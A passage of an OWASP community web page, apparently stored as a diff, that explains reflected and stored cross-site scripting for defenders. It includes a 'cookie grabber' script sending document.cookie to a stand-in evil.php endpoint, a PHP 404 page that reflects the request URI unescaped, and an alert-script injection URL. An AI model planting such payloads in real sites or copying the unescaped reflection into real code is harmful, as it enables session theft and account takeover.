+  content back to the user, the content is executed and proceeds to
+  transfer private information, such as cookies that may include
+  session information, from the user’s machine to the attacker or
+  perform other nefarious activities.</li>
+  <li>As in Example 2, the application stores dangerous data in a database
+  or other trusted data store. The dangerous data is subsequently read
+  back into the application and included in dynamic content. Stored
+  XSS exploits occur when an attacker injects dangerous content into a
+  data store that is later read and included in dynamic content. From
+  an attacker’s perspective, the optimal place to inject malicious
+  content is in an area that is displayed to either many users or
+  particularly interesting users. Interesting users typically have
+  elevated privileges in the application or interact with sensitive
+  data that is valuable to the attacker. If one of these users
+  executes malicious content, the attacker may be able to perform
+  privileged operations on behalf of the user or gain access to
+  sensitive data belonging to the user.</li>
+  <li>A source outside the application stores dangerous data in a database
+  or other data store, and the dangerous data is subsequently read
+  back into the application as trusted data and included in dynamic
+  content.</li>
+</ul>
+
+<h3 id="attack-examples">Attack Examples</h3>
+
+<p><strong>Example 1: Cookie Grabber</strong></p>
+
+<p>If the application doesn’t validate the input data, the attacker can
+easily steal a cookie from an authenticated user. All the attacker has
+to do is to place the following code in any posted input(ie: message
+boards, private messages, user profiles):</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;SCRIPT</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
+var adr = '../evil.php?cakemonster=' + escape(document.cookie);
+<span class="nt">&lt;/SCRIPT&gt;</span>
+</code></pre></div></div>
+
+<p>The above code will pass an escaped content of the cookie (according to
+RFC content must be escaped before sending it via HTTP protocol with GET
+method) to the evil.php script in “cakemonster” variable. The attacker
+then checks the results of their evil.php script (a cookie grabber script
+will usually write the cookie to a file) and use it.</p>
+
+<h3 id="error-page-example">Error Page Example</h3>
+
+<p>Let’s assume that we have an error page, which is handling requests for
+a non existing pages, a classic 404 error page. We may use the code
+below as an example to inform user about what specific page is missing:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="cp">&lt;?php
+print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
+?&gt;</span>
+
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Let’s see how it works: <code class="language-plaintext highlighter-rouge">http://testsite.test/file_which_not_exist</code>
+In response we get: <code class="language-plaintext highlighter-rouge">Not found: /file_which_not_exist</code></p>
+
+<p>Now we will try to force the error page to include our code: <code class="language-plaintext highlighter-rouge">http://testsite.test/&lt;script&gt;alert("TEST");&lt;/script&gt;</code>
+The result is: <code class="language-plaintext highlighter-rouge">Not found: / (but with JavaScript code &lt;script&gt;alert("TEST");&lt;/script&gt;)</code></p>
+
+<p>We have successfully injected the code, our XSS! What does it mean? For
+example, that we may use this flaw to try to steal a user’s session
+cookie.</p>
+
+<h2 id="related-attacks">Related <a href="https://owasp.org/www-community/attacks/">Attacks</a></h2>
+
+<ul>
+  <li><a href="https://owasp.org/www-community/attacks/xss/">XSS Attacks</a></li>
+  <li><a href="https://owasp.org/www-community/attacks/Mobile_code_invoking_untrusted_mobile_code">Invoking untrusted mobile code</a></li>
+  <li><a href="https://owasp.org/www-community/attacks/Cross_Site_History_Manipulation_(XSHM)">Cross Site History Manipulation (XSHM)</a></li>
+</ul>
+
+<h2 id="related-vulnerabilities">Related <a href="https://owasp.org/www-community/vulnerabilities/">Vulnerabilities</a></h2>
+
+<ul>
+  <li><a href="https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation">Improper Data Validation</a></li>
+  <li><a href="https://owasp.org/www-community/Types_of_Cross-Site_Scripting">Types of Cross-Site Scripting</a></li>
+  <li>OWASP Development Guide <a href="https://wiki.owasp.org/index.php/Data_Validation">article on Data Validation</a></li>
+  <li>OWASP Development Guide <a href="https://wiki.owasp.org/index.php/Phishing">article on Phishing</a></li>
+</ul>
+
+<h2 id="related-controls">Related Controls</h2>
+
+<ul>
+  <li><a href="https://wiki.owasp.org/index.php/Data_Validation">Data Validation</a></li>
+</ul>
+
+<h2 id="references">References</h2>
+
+<ul>
+  <li>OWASP’s <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">XSS (Cross Site Scripting) Prevention Cheat Sheet</a></li>
+  <li><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html">Testing_for_Reflected_Cross_site_scripting</a></li>
+  <li><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html">Testing_for_Stored_Cross_site_scripting</a></li>
+  <li><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.html">Testing_for_DOM-based_Cross_site_scripting</a></li>
+  <li><a href="https://www.cgisecurity.com/xss-faq.html">The Cross Site Scripting FAQ</a></li>
+  <li>OWASP <a href="/xss-filter-evasion-cheatsheet">XSS Filter Evasion Cheat Sheet</a></li>
+  <li><a href="http://www.cert.org/advisories/CA-2000-02.html">CERT Advisory on Malicious HTML Tags</a></li>
+  <li><a href="http://www.cert.org/tech_tips/malicious_code_mitigation.html">CERT “Understanding Malicious Content Mitigation</a></li>
+  <li><a href="http://www.technicalinfo.net/papers/CSS.html">Understanding the cause and effect of CSS Vulnerabilities</a></li>
+  <li><a href="http://www.xssed.com">XSSed</a> - Cross-Site Scripting (XSS) Information and Mirror Archive of Vulnerable Websites</li>
+</ul>
+
+<p><a href="https://owasp.org/www-community/Injection_Flaws">Category:Injection</a>
+<a href="https://owasp.org/www-project-top-ten/">Category:OWASP Top Ten Project</a>
+<a href="https://owasp.org/www-community/attacks/">Category:Attack</a></p>
+
+          </section>
+          
+
+          
+          
+          
+          
+          
+          
+          
+       </div>
+       <hr>
+       <div class="repo">
+       </div>
+
+          <div class="github-buttons">
+    <a class="github-button" href="https://github.com/owasp/www-community/subscription" data-icon="octicon-eye" data-size="large" data-show-count="true" aria-label="Watch on GitHub">Watch</a>
+    <a class="github-button" href="https://github.com/owasp/www-community" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star on GitHub">Star</a>
+ </div>
+
+          <div class="sidebar" role="complementary">
+    
+
+    
+    
+       
+
+
+
+  
+  <div class='owasp-sidebar-top'>
+    <strong>The OWASP<sup>&reg;</sup> Foundation</strong> works to improve the security of software through its community-led open source software projects, 
+     hundreds of chapters worldwide, tens of thousands of members, and by hosting local and global conferences.
+</div>
+
+
+  
+  
+  <h3 id="important-community-links">Important Community Links</h3>
+<ul>
+  <li><a href="/www-community/">Community</a></li>
+  <li>Attacks (You are here)</li>
+  <li><a href="/www-community/vulnerabilities">Vulnerabilities</a></li>
+  <li><a href="/www-community/controls">Controls</a></li>
+</ul>
+
+  
+  
+  
+
+  <div class='owasp-sidebar-bottom'>
+   <h3>Upcoming OWASP Global Events</h3>
+   <div id='global-event-div'>
+
+   </div>
+</div>
+
+<script type="text/javascript">
+   var events = [];
+   $(function () {
+      eventsyml = YAML.load('https://owasp.org/assets/sitedata/events.yml');
+
+      $.each(eventsyml, function (index) {
+         if (this.category == 'Global') {
+            for (e in this.events) {
+               events.push(this.events[e]);
+            }
+         }
+      });
+
+      if (events.length > 0) {
+         var htmlstring = "<ul>";
+         for (evnt in events) {
+            if (events[evnt].url)
+               htmlstring += '<li><a href="' + events[evnt].url
+            else
+               htmlstring += '<li><a href="https://owasp.org/events/'
+
+            htmlstring += '" target="_blank rel="noopener">' + events[evnt].name + '</a>';
+
+            if (typeof events[evnt].dates === 'undefined') {
+               events[evnt].dates = 'TBA';
+            }
+
+            htmlstring += "<ul><li style='list-style-type: circle;margin-top: 0px;padding:0px;margin-left:16px;'>" + events[evnt].dates + "</li></ul></li>";
+         }
+         htmlstring += "</ul>";
+
+         $("#global-event-div").html(htmlstring);
+      }
+   });
+</script>
+
+  <!--<div>
+    <h3>OWASP News & Opinions</h3>
+    <ul>
+    	
+    </ul>	
+  </div>-->
+</div>
+
+      </div>
+    </main>
+    <footer>
+  
+  <section class="member">
+
+  <script type="text/javascript">
+    var members = [];
+    var plat_indices = [];
+    var gold_indices = [];
+    var other_indices = [];
+
+    function get_next_member(members, indexUsed){
+      // random 6
+      // 0 to 2 = Platinum (.2 > Other)
+      // 3 to 4 = Gold (.1 > Other)
+      // 5 = Other  
+      member = null;
+      chosenIndex = -1;
+      var pick = Math.floor(Math.random() * 100);      
+      var randomIndex = -1;
+      if(pick < 44){
+        // pick a platinum member
+        randomIndex = Math.floor(Math.random() * plat_indices.length);
+        pIndex = plat_indices[randomIndex];            
+        cycleIndex = randomIndex
+        while(chosenIndex == -1)
+        {
+          randomIndex++;
+          if(indexUsed.indexOf(pIndex)== -1){
+            chosenIndex = pIndex;
+            
+          }else if(randomIndex >= plat_indices.length){
+            randomIndex = 0;
+            
+          }
+          if (randomIndex == cycleIndex){ // we could not find a plat member not already in the list....            
+            break;
+          }
+        }
+      }
+      if (chosenIndex == -1 && pick < 77) {
+        // pick a gold member
+        randomIndex = Math.floor(Math.random() * gold_indices.length);
+        pIndex = gold_indices[randomIndex];            
+        cycleIndex = randomIndex
+        while(chosenIndex == -1)
+        {
+          randomIndex++;
+          if(indexUsed.indexOf(pIndex)== -1){
+            chosenIndex = pIndex;
+            
+          }else if(randomIndex >= gold_indices.length){
+            randomIndex = 0;
+            
+          }
+          if (randomIndex == cycleIndex){ // we could not find a plat member not already in the list....            
+            break;
+          }
+        }
+      }
+      if (chosenIndex == -1){
+        // pick an other member
+        randomIndex = Math.floor(Math.random() * other_indices.length);
+        pIndex = other_indices[randomIndex];            
+        cycleIndex = randomIndex
+        while(chosenIndex == -1)
+        {
+          randomIndex++;
+          if(indexUsed.indexOf(pIndex)== -1){
+            chosenIndex = pIndex;
+            
+          }else if(randomIndex >= other_indices.length){
+            randomIndex = 0;
+            
+          }
+          if (randomIndex == cycleIndex){ // we could not find a plat member not already in the list....            
+            break;
+          }
+        }
+      }    
+      if(chosenIndex >= 0){          
+        member = members[chosenIndex];
+        indexUsed.push(chosenIndex);
+        var membertype = 'not a member';
+        if(member.member && (member.membertype == 1 || !member.membertype))
+          membertype = 'silver member';
+        else if(member.member && member.membertype == 2)
+          membertype = 'platinum member';
+        else if(member.member && member.membertype == 3)
+          membertype = 'gold member';
+        else if(member.member && member.membertype)
+          membertype = member.membertype;        
+      }
+      return member;      
+    }
+
+    $(function() {  
+      var corp_members = YAML.load('https://owasp.org/assets/sitedata/corp_members.yml');
+      $.each(corp_members, function (index) {
+          index = members.push(this) - 1;  
+          if(this.member && this.membertype == 3)
+            gold_indices.push(index);
+          else if (this.member && this.membertype == 2)
+            plat_indices.push(index);
+          else
+            other_indices.push(index);        
+        });
+
+        var indexUsed = [];
+
+        var counter = 0;
+        var numberOfImages = 9;
+        var member = get_next_member(members, indexUsed);
+        htmlstring = '<h2>Spotlight: ' + member["name"] + '</h2>';
+        htmlstring += '<a href="'+ member["url"] + '" rel="sponsored nopener noreferrer" target="_blank" onclick="handleOutboundLinkClicks(event);"><img src="https://owasp.org' + member["image"] + '" alt="image" /></a>';
+        htmlstring += '<p>' + member["description"] + '</p>';
+        $(".member-spotlight").html(htmlstring);
+
+        if(members.length > 0)
+        {
+          var htmlstring = "";
+          while (counter < numberOfImages)
+          {
+            member = get_next_member(members, indexUsed)
+            if (member)
+            {
+                counter++;
+                htmlstring += '<a href="'+ member["url"] + '" class="member-logo" rel="sponsored noopener noreferrer" target="_blank" onclick="handleOutboundLinkClicks(event);"><img src="https://owasp.org' + member["image"] + '" alt="image"/></a>';                                
+            }
+          }
+
+          $("#corp_member_div").html(htmlstring);
+         
+          
+        }
+    });
+  </script>
+  <div class="member-wrapper">
+    <section class="member-spotlight">
+    </section>
+    <section class="member-list">
+      <h2>Corporate Supporters</h2>
+      <div id="corp_member_div">
+      </div>
+      <div class="member-cta">
+        <a class="callout-link" href="https://owasp.org/supporters">Become a corporate supporter</a>
+      </div>
+    </section>
+  </div>
+</section>
+
+  
+  <section class="footer-wrapper">
+    <section class="social">
+<a href="https://github.com/OWASP/" aria-label="github organization" target="_blank" rel="noopener noreferrer"><i class="fa fa-lg fa-github"></i></a>
+<a href="https://owasp.org/slack/invite" aria-label="slack group" target="_blank" rel="noopener noreferrer"><i class="fa fa-lg fa-slack"></i></a>
+<a href="https://www.facebook.com/OWASPFoundation" aria-label="facebook group" target="_blank" rel="noopener noreferrer"><i class="fa fa-lg fa-facebook-square"></i></a>
+<!-- Mastodon Icon will not load; FA instance is too old. Use the SVG instead-->
+<a href="https://infosec.exchange/@owasp" aria-label="mastodon account" target="_blank" rel="me"><svg xmlns="http://www.w3.org/2000/svg" height="24" width="24" viewBox="0 0 448 512"><!--!Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2024 Fonticons, Inc.--><path d="M433 179.1c0-97.2-63.7-125.7-63.7-125.7-62.5-28.7-228.6-28.4-290.5 0 0 0-63.7 28.5-63.7 125.7 0 115.7-6.6 259.4 105.6 289.1 40.5 10.7 75.3 13 103.3 11.4 50.8-2.8 79.3-18.1 79.3-18.1l-1.7-36.9s-36.3 11.4-77.1 10.1c-40.4-1.4-83-4.4-89.6-54a102.5 102.5 0 0 1 -.9-13.9c85.6 20.9 158.7 9.1 178.8 6.7 56.1-6.7 105-41.3 111.2-72.9 9.8-49.8 9-121.5 9-121.5zm-75.1 125.2h-46.6v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.3V197c0-58.5-64-56.6-64-6.9v114.2H90.2c0-122.1-5.2-147.9 18.4-175 25.9-28.9 79.8-30.8 103.8 6.1l11.6 19.5 11.6-19.5c24.1-37.1 78.1-34.8 103.8-6.1 23.7 27.3 18.4 53 18.4 175z"/></svg></a>
+<!-- Twitter X Icon will not load; I suspect another dependency (Jekyll?) is using an older version that is conflicting. So use the SVG instead-->
+<a href="https://twitter.com/owasp" aria-label="twitter account" target="_blank" rel="noopener noreferrer"><svg xmlns="http://www.w3.org/2000/svg" height="24" width="24" viewBox="0 0 512 512"><!--!Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2024 Fonticons, Inc.--><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></a>
+<a href="https://www.linkedin.com/company/owasp/" aria-label="linkedin account" target="_blank" rel="noopener noreferrer"><i class="fa fa-lg fa-linkedin"></i></a>
+<a href="https://www.youtube.com/user/OWASPGLOBAL" aria-label="youtube account" target="_blank" rel="noopener noreferrer"><i class="fa fa-lg fa-youtube-square"></i></a>
+</section>
+
+    <nav class="bot-nav" role="navigation" aria-label="secondary navigation">
+      <ul>
+        <li><a href="https://owasp.org/">HOME</a></li>
+        <li><a href="https://owasp.org/projects/">PROJECTS</a></li>
+        <li><a href="https://owasp.org/chapters/">CHAPTERS</a></li>
+        <li><a href="https://owasp.org/events/">EVENTS</a></li>
+        <li><a href="https://owasp.org/about/">ABOUT</a></li>
+        <li><a href="https://owasp.org/www-policy/operational/privacy">PRIVACY</a></li>
+        <li><a href="https://owasp.org/sitemap/">SITEMAP</a></li>
+        <li><a href="https://owasp.org/contact/">CONTACT</a></li>
+      </ul>
+    </nav>
+    <p class="disclaimer">
+      OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, OWASP Boston Application Security Conference, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our <a href="https://policy.owasp.org/operational/general-disclaimer.html">General Disclaimer</a>. OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2026, OWASP Foundation, Inc.
+    </p>
+  </section>
+</footer>
+
+  </body>
+</html>
+
+
